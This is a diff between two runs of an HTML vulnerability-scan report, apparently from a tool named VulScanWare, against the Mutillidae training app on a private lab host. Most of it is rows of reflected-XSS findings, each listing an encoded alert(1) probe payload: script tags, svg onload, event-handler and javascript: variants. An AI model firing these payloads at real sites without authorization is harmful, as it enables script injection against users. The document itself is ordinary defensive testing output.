@@ -19,15 +19,15 @@
                     <body>
                     
                     <h1>VulScanWare Scan Report</h1>
-                    <p><b>Generated:</b> 2026-01-07T21:18:01.185470</p>
+                    <p><b>Generated:</b> 2026-02-05T05:56:14.983023</p>
                     <p><b>Phase:</b> done</p>
                     
                     <h2>Summary</h2>
                     <ul>
-                      <li>URLs Crawled: 5</li>
-                      <li>Vulnerabilities Found: 84</li>
+                      <li>URLs Crawled: 10</li>
+                      <li>Vulnerabilities Found: 147</li>
                       <li>AI Remediations: 1</li>
-                      <li>Time Taken: 40.33s</li>
+                      <li>Time Taken: 43.96s</li>
                     </ul>
                     
                     <h2>Vulnerabilities</h2>
@@ -41,16 +41,296 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-hints&page=%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B </td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%253Cscript%253Ealert%25281%2529%253C%2Fscript%253E </td>
                       <td class="sev-high">high</td>
-                      <td><pre>This is a dangerous vulnerability because it allows an attacker to inject malicious code into a web page viewed by other users. In this case, the payload is an alert message that will be displayed when the page is loaded. However, an attacker could replace this with any malicious code they want, such as stealing user credentials or executing malware on the user's computer.
+                      <td><pre>This is a dangerous vulnerability because it allows an attacker to inject malicious code into a web page viewed by other users. In this case, the payload is an alert box that will be displayed when the page is loaded. However, an attacker could replace this with any malicious code they want, such as stealing user credentials or executing malware on the user's computer.
             
             To remediate this vulnerability, the application should sanitize user input and only allow safe characters in the page parameter. This can be done using techniques such as input validation, output encoding, and content security policies. Additionally, the application should use parameterized queries or prepared statements when interacting with the database to prevent SQL injection attacks.</pre></td>
                     </tr>
                     
                     <tr>
                       <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-hints&page=%3Cscript%3Ealert%281%29%3C%2Fscript%3E </td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%3Cscript%3Ealert%281%29%3C%2Fscript%3E </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%253Cscript%253Ealert%281%29%253C%2Fscript%253E </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26lt%3Bsvg%2Fonload%3Dalert%281%29%26gt%3B </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%3Csvg%2Fonload%3Dalert%281%29%3E </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%253Csvg%2Fonload%3Dalert%281%29%253E </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%253Csvg%2Fonload%253Dalert%25281%2529%253E </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%22+onmouseover%3Dalert%281%29+x%3D%22 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%2522%2520onmouseover%253Dalert%25281%2529%2520x%253D%2522 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26quot%3B+onmouseover%3Dalert%281%29+x%3D%26quot%3B </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%2527%2520autofocus%2520onfocus%253Dalert%25281%2529%2520%2527 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26%23x27%3B+autofocus+onfocus%3Dalert%281%29+%26%23x27%3B </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%27+autofocus+onfocus%3Dalert%281%29+%27 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%2527%253Balert%25281%2529%253B%2F%2F </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%27%3Balert%281%29%3B%2F%2F </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26%23x27%3B%3Balert%281%29%3B%2F%2F </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=alert%281%29 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=alert%25281%2529 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=javascript%3Aalert%281%29 </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=javascript%253Aalert%25281%2529 </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%253Cscript%253Ealert%25281%2529%253C%2Fscript%253E </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%3Cscript%3Ealert%281%29%3C%2Fscript%3E </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%253Cscript%253Ealert%281%29%253C%2Fscript%253E </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26lt%3Bsvg%2Fonload%3Dalert%281%29%26gt%3B </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%3Csvg%2Fonload%3Dalert%281%29%3E </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%253Csvg%2Fonload%3Dalert%281%29%253E </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%253Csvg%2Fonload%253Dalert%25281%2529%253E </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%22+onmouseover%3Dalert%281%29+x%3D%22 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%2522%2520onmouseover%253Dalert%25281%2529%2520x%253D%2522 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26quot%3B+onmouseover%3Dalert%281%29+x%3D%26quot%3B </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%2527%2520autofocus%2520onfocus%253Dalert%25281%2529%2520%2527 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26%23x27%3B+autofocus+onfocus%3Dalert%281%29+%26%23x27%3B </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%27+autofocus+onfocus%3Dalert%281%29+%27 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%2527%253Balert%25281%2529%253B%2F%2F </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%27%3Balert%281%29%3B%2F%2F </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26%23x27%3B%3Balert%281%29%3B%2F%2F </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=alert%281%29 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=alert%25281%2529 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=javascript%3Aalert%281%29 </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=javascript%253Aalert%25281%2529 </td>
                       <td class="sev-high">high</td>
                       <td><pre>—</pre></td>
                     </tr>
@@ -64,7 +344,21 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-hints&page=%3Cscript%3Ealert%281%29%3C%2Fscript%3E </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
                       <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-hints&page=%253Cscript%253Ealert%281%29%253C%2Fscript%253E </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-hints&page=%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B </td>
                       <td class="sev-high">high</td>
                       <td><pre>—</pre></td>
                     </tr>
@@ -85,13 +379,6 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-hints&page=%253Csvg%2Fonload%253Dalert%25281%2529%253E </td>
-                      <td class="sev-medium">medium</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
                       <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-hints&page=%253Csvg%2Fonload%3Dalert%281%29%253E </td>
                       <td class="sev-medium">medium</td>
                       <td><pre>—</pre></td>
@@ -99,7 +386,7 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-hints&page=%2522%2520onmouseover%253Dalert%25281%2529%2520x%253D%2522 </td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-hints&page=%253Csvg%2Fonload%253Dalert%25281%2529%253E </td>
                       <td class="sev-medium">medium</td>
                       <td><pre>—</pre></td>
                     </tr>
@@ -107,6 +394,13 @@
                     <tr>
                       <td>Reflected XSS</td>
                       <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-hints&page=%22+onmouseover%3Dalert%281%29+x%3D%22 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-hints&page=%2522%2520onmouseover%253Dalert%25281%2529%2520x%253D%2522 </td>
                       <td class="sev-medium">medium</td>
                       <td><pre>—</pre></td>
                     </tr>
@@ -127,13 +421,6 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-hints&page=%27+autofocus+onfocus%3Dalert%281%29+%27 </td>
-                      <td class="sev-medium">medium</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
                       <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-hints&page=%26%23x27%3B+autofocus+onfocus%3Dalert%281%29+%26%23x27%3B </td>
                       <td class="sev-medium">medium</td>
                       <td><pre>—</pre></td>
@@ -141,7 +428,14 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-hints&page=%26%23x27%3B%3Balert%281%29%3B%2F%2F </td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-hints&page=%27+autofocus+onfocus%3Dalert%281%29+%27 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-hints&page=%2527%253Balert%25281%2529%253B%2F%2F </td>
                       <td class="sev-medium">medium</td>
                       <td><pre>—</pre></td>
                     </tr>
@@ -155,7 +449,7 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-hints&page=%2527%253Balert%25281%2529%253B%2F%2F </td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-hints&page=%26%23x27%3B%3Balert%281%29%3B%2F%2F </td>
                       <td class="sev-medium">medium</td>
                       <td><pre>—</pre></td>
                     </tr>
@@ -176,13 +470,6 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-hints&page=javascript%253Aalert%25281%2529 </td>
-                      <td class="sev-high">high</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
                       <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-hints&page=javascript%3Aalert%281%29 </td>
                       <td class="sev-high">high</td>
                       <td><pre>—</pre></td>
@@ -190,161 +477,7 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B </td>
-                      <td class="sev-high">high</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%3Cscript%3Ealert%281%29%3C%2Fscript%3E </td>
-                      <td class="sev-high">high</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%253Cscript%253Ealert%25281%2529%253C%2Fscript%253E </td>
-                      <td class="sev-high">high</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%253Cscript%253Ealert%281%29%253C%2Fscript%253E </td>
-                      <td class="sev-high">high</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26lt%3Bsvg%2Fonload%3Dalert%281%29%26gt%3B </td>
-                      <td class="sev-medium">medium</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%3Csvg%2Fonload%3Dalert%281%29%3E </td>
-                      <td class="sev-medium">medium</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%253Csvg%2Fonload%253Dalert%25281%2529%253E </td>
-                      <td class="sev-medium">medium</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%253Csvg%2Fonload%3Dalert%281%29%253E </td>
-                      <td class="sev-medium">medium</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%2522%2520onmouseover%253Dalert%25281%2529%2520x%253D%2522 </td>
-                      <td class="sev-medium">medium</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%22+onmouseover%3Dalert%281%29+x%3D%22 </td>
-                      <td class="sev-medium">medium</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26quot%3B+onmouseover%3Dalert%281%29+x%3D%26quot%3B </td>
-                      <td class="sev-medium">medium</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%2527%2520autofocus%2520onfocus%253Dalert%25281%2529%2520%2527 </td>
-                      <td class="sev-medium">medium</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%27+autofocus+onfocus%3Dalert%281%29+%27 </td>
-                      <td class="sev-medium">medium</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26%23x27%3B+autofocus+onfocus%3Dalert%281%29+%26%23x27%3B </td>
-                      <td class="sev-medium">medium</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26%23x27%3B%3Balert%281%29%3B%2F%2F </td>
-                      <td class="sev-medium">medium</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%27%3Balert%281%29%3B%2F%2F </td>
-                      <td class="sev-medium">medium</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%2527%253Balert%25281%2529%253B%2F%2F </td>
-                      <td class="sev-medium">medium</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=alert%281%29 </td>
-                      <td class="sev-medium">medium</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=alert%25281%2529 </td>
-                      <td class="sev-medium">medium</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=javascript%253Aalert%25281%2529 </td>
-                      <td class="sev-high">high</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=javascript%3Aalert%281%29 </td>
-                      <td class="sev-high">high</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-security&page=%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B </td>
-                      <td class="sev-high">high</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-security&page=%3Cscript%3Ealert%281%29%3C%2Fscript%3E </td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-hints&page=javascript%253Aalert%25281%2529 </td>
                       <td class="sev-high">high</td>
                       <td><pre>—</pre></td>
                     </tr>
@@ -358,7 +491,21 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-security&page=%3Cscript%3Ealert%281%29%3C%2Fscript%3E </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
                       <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-security&page=%253Cscript%253Ealert%281%29%253C%2Fscript%253E </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-security&page=%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B </td>
                       <td class="sev-high">high</td>
                       <td><pre>—</pre></td>
                     </tr>
@@ -379,13 +526,6 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-security&page=%253Csvg%2Fonload%253Dalert%25281%2529%253E </td>
-                      <td class="sev-medium">medium</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
                       <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-security&page=%253Csvg%2Fonload%3Dalert%281%29%253E </td>
                       <td class="sev-medium">medium</td>
                       <td><pre>—</pre></td>
@@ -393,7 +533,7 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-security&page=%2522%2520onmouseover%253Dalert%25281%2529%2520x%253D%2522 </td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-security&page=%253Csvg%2Fonload%253Dalert%25281%2529%253E </td>
                       <td class="sev-medium">medium</td>
                       <td><pre>—</pre></td>
                     </tr>
@@ -401,6 +541,13 @@
                     <tr>
                       <td>Reflected XSS</td>
                       <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-security&page=%22+onmouseover%3Dalert%281%29+x%3D%22 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-security&page=%2522%2520onmouseover%253Dalert%25281%2529%2520x%253D%2522 </td>
                       <td class="sev-medium">medium</td>
                       <td><pre>—</pre></td>
                     </tr>
@@ -421,13 +568,6 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-security&page=%27+autofocus+onfocus%3Dalert%281%29+%27 </td>
-                      <td class="sev-medium">medium</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
                       <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-security&page=%26%23x27%3B+autofocus+onfocus%3Dalert%281%29+%26%23x27%3B </td>
                       <td class="sev-medium">medium</td>
                       <td><pre>—</pre></td>
@@ -435,7 +575,14 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-security&page=%26%23x27%3B%3Balert%281%29%3B%2F%2F </td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-security&page=%27+autofocus+onfocus%3Dalert%281%29+%27 </td>
+                      <td class="sev-medium">medium</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-security&page=%2527%253Balert%25281%2529%253B%2F%2F </td>
                       <td class="sev-medium">medium</td>
                       <td><pre>—</pre></td>
                     </tr>
@@ -449,7 +596,7 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-security&page=%2527%253Balert%25281%2529%253B%2F%2F </td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-security&page=%26%23x27%3B%3Balert%281%29%3B%2F%2F </td>
                       <td class="sev-medium">medium</td>
                       <td><pre>—</pre></td>
                     </tr>
@@ -470,13 +617,6 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-security&page=javascript%253Aalert%25281%2529 </td>
-                      <td class="sev-high">high</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
                       <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-security&page=javascript%3Aalert%281%29 </td>
                       <td class="sev-high">high</td>
                       <td><pre>—</pre></td>
@@ -484,14 +624,7 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B </td>
-                      <td class="sev-high">high</td>
-                      <td><pre>—</pre></td>
-                    </tr>
-                    
-                    <tr>
-                      <td>Reflected XSS</td>
-                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%3Cscript%3Ealert%281%29%3C%2Fscript%3E </td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?do=toggle-security&page=javascript%253Aalert%25281%2529 </td>
                       <td class="sev-high">high</td>
                       <td><pre>—</pre></td>
                     </tr>
@@ -505,7 +638,21 @@
                     
                     <tr>
                       <td>Reflected XSS</td>
+                      <td>page - http://192.168.23.130/mutillidae/index.php?page=%3Cscript%3Ealert%281%29%3C%2Fscript%3E </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
                       <td>page - http://192.168.23.130/mutillidae/index.php?page=%253Cscript%253Ealert%281%29%253C%2Fscript%253E </td>
+                      <td class="sev-high">high</td>
+                      <td><pre>—</pre></td>
+                    </tr>
+                    
+                    <tr>
+                      <td>Reflected XSS</td>
